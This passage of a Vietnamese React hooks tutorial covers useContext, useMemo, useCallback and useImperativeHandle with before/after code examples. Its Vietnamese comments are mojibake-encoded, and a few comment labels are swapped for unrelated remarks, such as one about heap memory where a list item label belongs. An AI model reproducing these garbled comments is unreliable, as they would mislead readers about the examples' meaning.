 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const ThemeContext = createContext('light');
const UserContext = createContext(null);
const LanguageContext = createContext('en');

function App() {
  const [theme, setTheme] = useState('light');
  const [user, setUser] = useState(null);
  const [lang, setLang] = useState('en');
  
  return (
    <ThemeContext.Provider value={theme}>
      <UserContext.Provider value={user}>
        <LanguageContext.Provider value={lang}>
          <Dashboard />
        </LanguageContext.Provider>
      </UserContext.Provider>
    </ThemeContext.Provider>
  );
}

function Dashboard() {
  const theme = useContext(ThemeContext);
  const user = useContext(UserContext);
  const lang = useContext(LanguageContext);
  
  return (
    <div className={theme}>
      Welcome {user?.name} ({lang})
    </div>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: CUSTOM HOOK PATTERN (Best practice)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

type AuthContextType = {
  user: User | null;
  login: (email: string, password: string) => Promise<void>;
  logout: () => void;
  loading: boolean;
};

const AuthContext = createContext<AuthContextType | undefined>(undefined);

 // Ch√∫ gi·∫£i: Custom hook v·ªõi error checking
function useAuth() {
  const context = useContext(AuthContext);
  
  if (context === undefined) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  
  return context;
}

 // Ch√∫ gi·∫£i: Provider component
function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(false);
  
  const login = async (email: string, password: string) => {
    setLoading(true);
    try {
      const user = await authService.login(email, password);
      setUser(user);
    } finally {
      setLoading(false);
    }
  };
  
  const logout = () => {
    authService.logout();
    setUser(null);
  };
  
  const value = useMemo(
    () => ({ user, login, logout, loading }),
    [user, loading]
  );
  
  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
}

 // Ch√∫ gi·∫£i: Usage
function App() {
  return (
    <AuthProvider>
      <Dashboard />
    </AuthProvider>
  );
}

function Dashboard() {
  const { user, logout } = useAuth(); // Ch√∫ gi·∫£i: ‚úÖ Type-safe, error checking
  
  return (
    <div>
      <p>Welcome {user?.name}</p>
      <button onClick={logout}>Logout</button>
    </div>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

// ‚ùå Problem: All consumers re-render khi B·∫§T K·ª≤ value n√†o thay ƒë·ªïi
function AppBad() {
  const [user, setUser] = useState(null);
  const [theme, setTheme] = useState('light');
  
 // Ch√∫ gi·∫£i: ‚ùå New object m·ªói render ‚Üí all consumers re-render
  const value = { user, theme, setUser, setTheme };
  
  return (
    <AppContext.Provider value={value}>
      <Component1 /> {/* Re-render khi theme ƒë·ªïi d√π ch·ªâ d√πng user */}
      <Component2 /> {/* Re-render khi user ƒë·ªïi d√π ch·ªâ d√πng theme */}
    </AppContext.Provider>
  );
}

 // Ch√∫ gi·∫£i: ‚úÖ Solution 1: Split contexts
function AppGood() {
  const [user, setUser] = useState(null);
  const [theme, setTheme] = useState('light');
  
  const userValue = useMemo(() => ({ user, setUser }), [user]);
  const themeValue = useMemo(() => ({ theme, setTheme }), [theme]);
  
  return (
    <UserContext.Provider value={userValue}>
      <ThemeContext.Provider value={themeValue}>
        <Component1 /> {/* Ch·ªâ re-render khi user ƒë·ªïi */}
        <Component2 /> {/* Ch·ªâ re-render khi theme ƒë·ªïi */}
      </ThemeContext.Provider>
    </UserContext.Provider>
  );
}

 // Ch√∫ gi·∫£i: ‚úÖ Solution 2: React.memo cho consumers
const Component1 = React.memo(function Component1() {
  const { user } = useContext(UserContext);
  return <div>{user?.name}</div>;
});
```

---

##### **1.7. useMemo - Memoized Value Hook**

**üéØ M·ª•c ƒë√≠ch:**
Cache k·∫øt qu·∫£ c·ªßa expensive calculations, ch·ªâ re-compute khi dependencies thay ƒë·ªïi.

**üìñ Khi n√†o d√πng useMemo:**
1. Expensive calculations (sorting, filtering large arrays)
2. Preventing re-creation of objects/arrays (pass to child components)
3. Optimizing child component re-renders

**üí° Chi ti·∫øt k·ªπ thu·∫≠t:**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: BASIC PATTERN
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function ProductList({ products, filter }) {
 // Ch√∫ gi·∫£i: ‚ùå Without useMemo: Sort l·∫°i M·ªñI l·∫ßn component re-render
  const sortedProducts = products.sort((a, b) => a.price - b.price);
  
  // ‚úÖ With useMemo: Ch·ªâ sort khi products ho·∫∑c filter thay ƒë·ªïi
  const sortedProducts = useMemo(() => {
    console.log('Sorting...'); // Ch√∫ gi·∫£i: Ch·ªâ log khi re-compute
    return products
      .filter(p => p.category === filter)
      .sort((a, b) => a.price - b.price);
  }, [products, filter]); // Ch√∫ gi·∫£i: Dependencies
  
  return (
    <ul>
      {sortedProducts.map(p => <li key={p.id}>{p.name}</li>)}
    </ul>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: EXPENSIVE COMPUTATION
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function Fibonacci({ n }) {
  const result = useMemo(() => {
    function fib(num) {
      if (num <= 1) return num;
      return fib(num - 1) + fib(num - 2);
    }
    return fib(n);
  }, [n]);
  
  return <div>Fibonacci({n}) = {result}</div>;
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: PREVENT CHILD RE-RENDERS
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function Parent() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState('');
  
  // ‚ùå New object m·ªói render ‚Üí Child re-render d√π props "gi·ªëng"
  const config = { theme: 'dark', lang: 'en' };
  
  // ‚úÖ Stable reference ‚Üí Child ch·ªâ re-render khi config th·ª±c s·ª± ƒë·ªïi
  const config = useMemo(() => ({
    theme: 'dark',
    lang: 'en'
  }), []); // Ch√∫ gi·∫£i: No deps = never re-create
  
  return (
    <>
      <input value={name} onChange={e => setName(e.target.value)} />
      <Child config={config} /> {/* Kh√¥ng re-render khi name thay ƒë·ªïi */}
    </>
  );
}

const Child = React.memo(({ config }) => {
  console.log('Child rendered');
  return <div>{config.theme}</div>;
});

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: DERIVED STATE
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function TodoList({ todos }) {
  // Stats ch·ªâ re-compute khi todos thay ƒë·ªïi
  const stats = useMemo(() => ({
    total: todos.length,
    completed: todos.filter(t => t.done).length,
    active: todos.filter(t => !t.done).length,
    completionRate: todos.length > 0 
      ? (todos.filter(t => t.done).length / todos.length * 100).toFixed(1)
      : '0'
  }), [todos]);
  
  return (
    <div>
      <p>Total: {stats.total}</p>
      <p>Completed: {stats.completed}</p>
      <p>Active: {stats.active}</p>
      <p>Completion: {stats.completionRate}%</p>
    </div>
  );
}
```

**‚ö†Ô∏è Khi KH√îNG n√™n d√πng useMemo:**

```typescript
 // Heap l∆∞u object v√† m·∫£ng; ƒë∆∞·ª£c runtime qu·∫£n l√Ω b·ªüi tr√¨nh thu gom r√°c.
const doubled = useMemo(() => count * 2, [count]);
 // Ch√∫ gi·∫£i: ‚úÖ Just compute directly
const doubled = count * 2;

// ‚ùå 2. Primitives (kh√¥ng c·∫ßn memoize)
const greeting = useMemo(() => 'Hello', []);
 // Ch√∫ gi·∫£i: ‚úÖ Just use constant
const greeting = 'Hello';

 // Ch√∫ gi·∫£i: ‚ùå 3. Over-optimization (premature optimization)
const data = useMemo(() => transform(props.data), [props.data]);
// ‚úÖ Profile first! N·∫øu kh√¥ng c√≥ performance issue, ƒë·ª´ng d√πng

// Rule: Ch·ªâ d√πng useMemo khi:
// - C√≥ performance issue ƒëo ƒë∆∞·ª£c (React DevTools Profiler)
 // Ch√∫ gi·∫£i: - Computation th·ª±c s·ª± expensive (>10ms)
 // Ch√∫ gi·∫£i: - Prevent child re-renders (v·ªõi React.memo)
```

---

##### **1.8. useCallback - Memoized Function Hook**

**üéØ M·ª•c ƒë√≠ch:**
Cache function reference, tr√°nh re-create function m·ªói render (optimization cho child components).

**üìñ useCallback vs useMemo:**

```typescript
 // Ch√∫ gi·∫£i: useCallback: Memoize FUNCTION
const memoizedCallback = useCallback(() => {
  doSomething(a, b);
}, [a, b]);

 // Ch√∫ gi·∫£i: Equivalent to:
const memoizedCallback = useMemo(() => {
  return () => doSomething(a, b);
}, [a, b]);

 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);
```

**üí° Chi ti·∫øt k·ªπ thu·∫≠t:**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: BASIC USAGE
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function Parent() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState('');
  
 // Ch√∫ gi·∫£i: ‚ùå New function m·ªói render ‚Üí Child re-render
  const handleClick = () => {
    console.log('Clicked');
  };
  
  // ‚úÖ Stable reference ‚Üí Child kh√¥ng re-render
  const handleClick = useCallback(() => {
    console.log('Clicked');
  }, []); // Ch√∫ gi·∫£i: No deps = never re-create
  
  return (
    <>
      <input value={name} onChange={e => setName(e.target.value)} />
      <Child onClick={handleClick} /> {/* Kh√¥ng re-render khi name ƒë·ªïi */}
    </>
  );
}

const Child = React.memo(({ onClick }) => {
  console.log('Child rendered');
  return <button onClick={onClick}>Click</button>;
});

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: WITH DEPENDENCIES
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function SearchBox() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  
  // Function re-create khi query thay ƒë·ªïi
  const handleSearch = useCallback(async () => {
    const data = await fetch(`/api/search?q=${query}`);
    setResults(await data.json());
  }, [query]); // Ch√∫ gi·∫£i: Dependency: query
  
 // Ch√∫ gi·∫£i: Debounced version
  const debouncedSearch = useCallback(
    debounce(handleSearch, 300),
    [handleSearch]
  );
  
  return (
    <div>
      <input 
        value={query} 
        onChange={e => setQuery(e.target.value)}
      />
      <button onClick={handleSearch}>Search</button>
    </div>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: EVENT HANDLERS WITH STATE
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function TodoItem({ todo, onToggle, onDelete }) {
  // ‚ùå T·∫°o function m·ªõi m·ªói render (n·∫øu kh√¥ng memo)
  const handleToggle = () => onToggle(todo.id);
  const handleDelete = () => onDelete(todo.id);
  
  // ‚úÖ Stable references (n·∫øu parent truy·ªÅn memoized callbacks)
  const handleToggle = useCallback(() => {
    onToggle(todo.id);
  }, [todo.id, onToggle]);
  
  const handleDelete = useCallback(() => {
    onDelete(todo.id);
  }, [todo.id, onDelete]);
  
  return (
    <li>
      <input type="checkbox" onChange={handleToggle} />
      {todo.text}
      <button onClick={handleDelete}>Delete</button>
    </li>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: CUSTOM HOOKS
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function useDebounce(callback, delay, deps) {
  const timeoutRef = useRef(null);
  
  return useCallback((...args) => {
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
    }
    
    timeoutRef.current = setTimeout(() => {
      callback(...args);
    }, delay);
  }, [callback, delay, ...deps]);
}

 // Ch√∫ gi·∫£i: Usage
function Search() {
  const [query, setQuery] = useState('');
  
  const search = useCallback((q) => {
    console.log('Searching for:', q);
  }, []);
  
  const debouncedSearch = useDebounce(search, 500, []);
  
  return (
    <input 
      value={query}
      onChange={e => {
        setQuery(e.target.value);
        debouncedSearch(e.target.value);
      }}
    />
  );
}
```

**‚ö†Ô∏è Common Mistakes:**

```typescript
// ‚ùå 1. useCallback without React.memo (v√¥ √≠ch)
function Parent() {
  const handleClick = useCallback(() => {}, []); // V√¥ √≠ch v√¨ Child kh√¥ng memo!
  return <Child onClick={handleClick} />;
}

function Child({ onClick }) { // ‚ùå Kh√¥ng memo ‚Üí v·∫´n re-render
  return <button onClick={onClick}>Click</button>;
}

// ‚úÖ Fix: D√πng React.memo
const Child = React.memo(({ onClick }) => {
  return <button onClick={onClick}>Click</button>;
});

 // Ch√∫ gi·∫£i: ‚ùå 2. Missing dependencies
const handleClick = useCallback(() => {
  console.log(count); // ‚ùå count kh√¥ng c√≥ trong deps ‚Üí stale
}, []);

 // Ch√∫ gi·∫£i: ‚úÖ Fix: Include count
const handleClick = useCallback(() => {
  console.log(count);
}, [count]);

 // Ch√∫ gi·∫£i: ‚ùå 3. Over-optimization
const handleClick = useCallback(() => {
  setCount(c => c + 1);
}, []); // ‚ùå Kh√¥ng c·∫ßn thi·∫øt n·∫øu kh√¥ng pass cho child

 // Ch√∫ gi·∫£i: ‚úÖ Just use regular function
const handleClick = () => {
  setCount(c => c + 1);
};
```

---

##### **1.9. useImperativeHandle - Customize Ref Exposure**

**üéØ M·ª•c ƒë√≠ch:**
Customize gi√° tr·ªã exposed qua ref t·ª´ child component (advanced pattern, √≠t d√πng).

**üìñ Khi n√†o d√πng:**
- Expose specific methods t·ª´ child (thay v√¨ to√†n b·ªô DOM node)
- T·∫°o reusable components v·ªõi imperative API
- Integration v·ªõi third-party libraries

**üí° Chi ti·∫øt k·ªπ thu·∫≠t:**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: BASIC PATTERN
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

type InputHandle = {
  focus: () => void;
  clear: () => void;
};

const CustomInput = forwardRef<InputHandle, { placeholder?: string }>(
  (props, ref) => {
    const inputRef = useRef<HTMLInputElement>(null);
    
    // Expose custom methods thay v√¨ DOM node
    useImperativeHandle(ref, () => ({
      focus: () => {
        inputRef.current?.focus();
      },
      clear: () => {
        if (inputRef.current) {
          inputRef.current.value = '';
        }
      }
    }), []); // Deps: re-create methods khi deps thay ƒë·ªïi
    
    return <input ref={inputRef} placeholder={props.placeholder} />;
  }
);

 // Ch√∫ gi·∫£i: Usage
function Parent() {
  const inputRef = useRef<InputHandle>(null);
  
  return (
    <>
      <CustomInput ref={inputRef} />
      <button onClick={() => inputRef.current?.focus()}>Focus</button>
      <button onClick={() => inputRef.current?.clear()}>Clear</button>
    </>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: FORM VALIDATION
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

type FormHandle = {
  submit: () => void;
  reset: () => void;
  validate: () => boolean;
  getValues: () => Record<string, any>;
};

const Form = forwardRef<FormHandle, { onSubmit: (data: any) => void }>(
  ({ onSubmit }, ref) => {
    const [values, setValues] = useState({});
    const [errors, setErrors] = useState({});
    
    const validate = useCallback(() => {
 // Ch√∫ gi·∫£i: Validation logic
      const newErrors = {};
      if (!values.email) newErrors.email = 'Required';
      setErrors(newErrors);
      return Object.keys(newErrors).length === 0;
    }, [values]);
    
    useImperativeHandle(ref, () => ({
      submit: () => {
        if (validate()) {
          onSubmit(values);
        }
      },
      reset: () => {
        setValues({});
        setErrors({});
      },
      validate,
      getValues: () => values
    }), [values, validate, onSubmit]);
    
    return (
      <form>
        {/* Form fields */}
      </form>
    );
  }
);

 // Ch√∫ gi·∫£i: Usage
function Parent() {
  const formRef = useRef<FormHandle>(null);
  
  return (
    <>
      <Form ref={formRef} onSubmit={console.log} />
